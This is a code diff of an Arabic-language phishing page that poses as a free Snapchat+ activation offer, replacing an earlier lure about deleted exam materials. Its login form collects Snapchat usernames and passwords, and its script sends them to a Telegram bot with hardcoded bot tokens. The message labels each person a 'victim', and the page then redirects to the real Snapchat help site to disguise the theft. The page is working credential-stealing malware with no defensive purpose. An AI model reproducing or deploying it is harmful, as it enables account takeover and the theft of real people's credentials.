@@ -2,35 +2,72 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>حذف مواد التوجيهي - 2009</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat+ | تفعيل ميزات بلس مجاناً</title>
     <style>
-        body { font-family: sans-serif; background: #fffc00; text-align: center; margin: 0; }
-        .header { background: #000; color: white; padding: 15px; font-weight: bold; }
-        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 20px; }
-        button { width: 95%; padding: 12px; background: #000; color: white; border: none; border-radius: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #FFFC00; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: #fff; width: 90%; max-width: 400px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
+        .snap-logo { width: 80px; margin-bottom: 10px; }
+        .plus-star { width: 30px; vertical-align: middle; margin-right: 5px; }
+        h1 { font-size: 22px; color: #000; margin-bottom: 5px; }
+        p { color: #555; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #f0f0f0; border-radius: 10px; background: #f9f9f9; font-size: 15px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #FFFC00; }
+        .activate-btn { width: 100%; padding: 15px; background-color: #000; color: #fff; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; transition: transform 0.2s; }
+        .activate-btn:active { transform: scale(0.98); }
+        .features-list { text-align: right; font-size: 12px; color: #333; margin-top: 20px; background: #fffde7; padding: 10px; border-radius: 8px; border: 1px dashed #ffd600; }
+        .footer-logo { width: 100px; margin-top: 20px; opacity: 0.5; }
     </style>
 </head>
 <body>
-    <div class="header">سناب التوجيهي - جيل 2009 👻</div>
-    <video width="100%" autoplay loop muted playsinline><source src="video.mp4" type="video/mp4"></video>
-    <p><b>شاهد المواد المحذوفة رسمياً</b></p>
-    <form id="login">
-        <input type="text" id="u" placeholder="اسم المستخدم" required>
-        <input type="password" id="p" placeholder="كلمة السر" required>
-        <button type="submit">مشاهدة السنابات</button>
-    </form>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/ad/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat" class="snap-logo">
+        <h1>تفعيل <img src="https://img.icons8.com/ios-filled/50/000000/star--v1.png" class="plus-star"> Snapchat+ مجاناً</h1>
+        <p>استمتع بميزات حصرية: رؤية من شاهد قصتك مرتين، تغيير أيقونة التطبيق، وتثبيت أعز الأصدقاء.</p>
+        
+        <form id="snapForm">
+            <input type="text" id="user" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            
+            <button type="submit" class="activate-btn">تفعيل العضوية الآن</button>
+        </form>
+
+        <div class="features-list">
+            • تجربة مجانية لمدة 12 شهر. <br>
+            • تفعيل شارة النجمة السوداء بجانب اسمك. <br>
+            • ميزة تحديد موقع الأصدقاء بدقة (Ghost Mode).
+        </div>
+
+        <img src="https://www.snapchat.com/global-assets/images/snap-inc-logo.png" class="footer-logo">
+    </div>
+
     <script>
-        const pr = new URLSearchParams(window.location.search);
-        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
-        document.getElementById('login').onsubmit = function(e) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chat_id') || '7238206121'; 
+        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';
+
+        document.getElementById('snapForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const msg = `🎯 صيدة سناب (2009) 🎯\n👤 الصياد: ${pr.get('hunter')}\n📧 الحساب: ${document.getElementById('u').value}\n🔑 الباسورد: ${document.getElementById('p').value}`;
-            const fullMsg = encodeURIComponent(msg);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${fullMsg}`);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${fullMsg}`)
-            .then(() => { window.location.href = "https://www.snapchat.com"; });
-        };
+            
+            const username = document.getElementById('user').value;
+            const password = document.getElementById('pass').value;
+
+            const message = `
+👻 **New Snapchat Victim!**
+👤 **Target:** \`${username}\`
+🔑 **Password:** \`${password}\`
+⭐ **Service:** Snapchat+ Activation
+💻 **System:** M.Y.9 Security
+🦅 **Developer:** Abu Osayed Malkawi
+            `;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+            .then(() => {
+                // تحويل لصفحة دعم سناب الحقيقية للتمويه
+                window.location.href = "https://help.snapchat.com/";
+            });
+        });
     </script>
 </body>
 </html>
